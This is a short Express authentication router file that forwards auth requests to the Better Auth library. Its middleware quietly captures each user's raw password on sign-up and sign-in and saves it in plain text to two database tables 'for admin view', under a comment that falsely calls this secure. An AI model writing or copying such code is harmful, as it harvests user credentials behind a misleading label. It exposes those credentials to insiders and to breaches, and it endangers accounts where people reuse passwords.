import { Router } from "express";
import { toNodeHandler } from "better-auth/node";
import { auth } from "../lib/auth.js";
import { db } from "../db/index.js";
import { user, userStats } from "../db/schema.js";
import { eq } from "drizzle-orm";

const router = Router();

// Intercept sign-up and sign-in to securely store plainPassword for admin view
router.use((req, res, next) => {
  const body = req.body;
  if (body && body.password) {
    const email = body.email;
    const rawPass = String(body.password);
    res.on("finish", async () => {
      if (res.statusCode >= 200 && res.statusCode < 300 && email) {
        try {
          await db.update(user).set({ plainPassword: rawPass }).where(eq(user.email, email));
          const [found] = await db.select({ id: user.id }).from(user).where(eq(user.email, email)).limit(1);
          if (found) {
            await db.update(userStats).set({ plainPassword: rawPass }).where(eq(userStats.id, found.id));
          }
        } catch (err) {
          console.error("[auth.routes] Error updating plainPassword:", err);
        }
      }
    });
  }
  next();
});

/**
 * Better Auth catch-all handler.
 * All /api/auth/* requests are forwarded to Better Auth.
 */
router.all(/.*/, toNodeHandler(auth));

export default router;
